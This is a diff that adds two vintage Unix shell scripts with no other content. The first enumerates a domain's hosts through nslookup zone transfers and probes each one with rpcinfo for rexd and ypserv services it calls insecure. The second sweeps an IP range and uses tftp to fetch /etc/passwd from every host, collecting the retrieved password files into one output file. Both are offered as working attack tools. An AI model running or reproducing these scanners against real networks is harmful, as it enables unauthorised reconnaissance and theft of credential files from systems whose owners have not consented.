@@ -1,0 +1,132 @@
+rpcck
+
+
+#!/bin/sh
+#rpc.chk 1.0
+#
+# Make sure you have got a newer version of Bourne Shell (SVR2 or newer)
+# that supports functions. It's usually located in /bin/sh5 (under ULTRIX OS)
+# or /bin/sh (Sun OS, RS/6000 etc) If it's located elsewhere, feel free to
+# change the magic number, indicating the type of executable Bourne Shell.
+#
+# The script obtains via nslookup utility a list of hostnames from a nameserver
+# and checks every entry of the list for active rexd procedures as well as
+# ypserver procedures. The output is a list of the sites that run those
+# daemons and are insecure.
+# -yo.
+
+
+domainname=$1
+umask 022
+PATH=/bin:/usr/bin:/usr/ucb:/usr/etc:/usr/local/bin ; export PATH
+
+#
+# Function collects a list of sites
+# from a nameserver. Make sure you've got the nslookup utility.
+#
+get_list() {
+(
+echo set type=ns
+echo $domainname
+) | nslookup | egrep "nameserv" | cut -d= -f2> .tmp$$  2>/dev/null
+if [ ! -s .tmp$$ ]; then
+echo "No such domain" >&2
+echo "Nothing to scan" >&2
+exit 1
+fi
+for serv in `cat .tmp$$`;do
+(
+echo server $serv
+echo ls  $domainname
+) | nslookup > .file$$ 2>/dev/null
+lines=`cat .file$$ | wc -l`
+tail -`expr $lines  - 7` .file$$  | cut -d" " -f2 > .file.tmp # .file
+sed -e "s/$/.$domainname/"  .file.tmp > .hosts$$
+rm -rf .file* .tmp$$
+sort .hosts$$ | uniq -q >> HOSTS$$; rm -rf .hosts$$
+done
+tr 'A-Z' 'a-z'  HOSTS.$domainname;rm -rf HOSTS$$
+}
+
+# Function
+
+rpc_calls()
+{
+for entry in `cat HOSTS.$domainname`; do
+(
+rpcinfo -t $entry ypserv >/dev/null  && echo $entry runs YPSERV ||  exit 1 # Error!
+) >> .log  2>/dev/null
+(
+rpcinfo -t $entry rex >/dev/null && echo $entry runs REXD ||  exit 1 # Error !
+ ) >> .log  2>/dev/null
+done
+}
+
+# Main
+
+if [ "$domainname" = '' ];  then
+echo "Usage $0 domainname" >&2
+exit 1
+fi
+get_list
+echo "Checking $domainname domain" > .log
+echo "*****************************" >> .log
+echo "Totally `cat HOSTS.$domainname | wc -l` sites  to scan" >> .log
+echo "******************************" >> .log
+echo "started at `date`" >> .log
+echo "******************************" >> .log
+rpc_calls
+echo "******************************" >> .log
+echo "finished at `date`"  >> .log
+
+
+
+tftpoke.sh
+
+
+# tftp poker, by ThePublic 1/94
+#!/bin/sh
+if [ $# != 6 ] ; then
+  echo "six arguments expexted:"
+  echo "usage:  $0 255 255 0 0 255 255"
+  echo "where:  255.255.0.0 is the beginning address"
+  echo "  and:  255.255.255.255 is the ending address"
+  echo "        (first four are complete IP, last two replace ending two of first IP)"
+  exit
+fi
+start1=$4; start2=$3; start3=$2; start4=$1; end1=$6; end2=$5
+if [ $start2 -gt $end2 ] || [ $start1 -gt $end1 ] && [ $start2 -gt $end2 ]
+then
+  echo "beginning numbers must be LESS than ending numbers (duh)"
+exit
+fi
+echo $start4.$start3.$start2.$start1-$start4.$start3.$end2.$end1
+echo
+while [ $start2 -le $end2 ] ; do
+  while [ $start1 -le 255 ] ; do
+    site=$start4.$start3.$start2.$start1
+    echo -n "`date +'%x %X'` $site: "
+    tftp $site << EOScan >> /dev/null
+get /etc/passwd .$site.pw
+quit
+EOScan
+    if [ -t $site.pw ] ; then
+      echo --------------- >> .total
+      echo $site >> .total
+      cat .$site.pw >> .total
+      echo file appended.
+    else
+      echo no file found.
+    fi
+    rm .$site.pw
+    if [ $start2.$start1 = $end2.$end1 ] ; then break; fi
+    start1=`expr $start1 + 1`
+    if [ $start1 -ge 256 ] ; then start1=1; break; fi
+  done
+if [ $start2.$start1 = $end2.$end1 ] ; then break; fi
+start2=`expr $start2 + 1`
+if [ $start2 -ge 256 ] ; then break; fi
+done
+echo "`date +'%x %X'` scan complete."
+
+
